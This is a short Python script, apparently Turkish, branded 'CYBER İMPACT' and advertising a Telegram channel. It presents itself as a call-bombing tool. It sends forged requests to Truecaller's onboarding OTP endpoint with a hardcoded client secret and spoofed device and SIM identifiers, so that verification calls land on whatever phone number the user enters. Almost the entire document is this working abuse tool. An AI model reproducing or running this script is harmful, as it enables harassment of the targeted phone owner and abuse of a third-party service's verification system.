import requests
import random
import hashlib
import pyfiglet

asa = '123456789'
gigk = str(''.join(random.choice(asa) for i in range(10)))
md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset=UTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
}

url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

def send_spam(phone_number):
    data = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": md5,
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": [
                    "8920022021714943876f",
                    "8920022022805258505f"
                ]
            }
        },
        "language": "ar",
        "sims": [
            {
                "imsi": "602022207634386",
                "mcc": "602",
                "mnc": "2",
                "operator": "vodafone"
            },
            {
                "imsi": "602023133590849",
                "mcc": "602",
                "mnc": "2",
                "operator": "vodafone"
            }
        ],
        "storeVersion": {
            "buildVersion": 8,
            "majorVersion": 12,
            "minorVersion": 34
        },
        "phoneNumber": phone_number,
        "region": "region-2",
        "sequenceNo": 1
    }

    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        print("\nGonderildi")
    else:
        print("\nHata")

text = "CYBER İMPACT ARAMA BOMBASI"
colors = ["31", "33", "32", "35", "36"]  # ANSI color codes for rainbow colors

for i, char in enumerate(text):
    color_code = colors[i % len(colors)]
    print(f"\033[1;{color_code}m{char}", end="")

print("\033[0m\n")  # Reset color to default after printing the rainbow text
print("\033[1;31mÜRETEN: CYBER İMPACT\n")
print("\033[1;32mDAHA FAZLA İÇERİK İÇİN KANALIMIZA KATIL t.me/TeknoDroidEvreni\n")
print("\033[1;33mBU TOOL CYBER İMPACT'E AİTTİR. \nEĞER SİZE BİR BAŞKASI TARAFINDAN SATILIRSA BİZE TELEGRAM ÜZERİNDEN BİLDİRİN @Tekn0Droid\n\n")
phone_number = input("\n\033[1;34mARAMA SPAMI GÖNDERECEĞİN NUMARAYI GİR\n\nÖRNEĞİN (+905555555555): ")
send_spam(phone_number)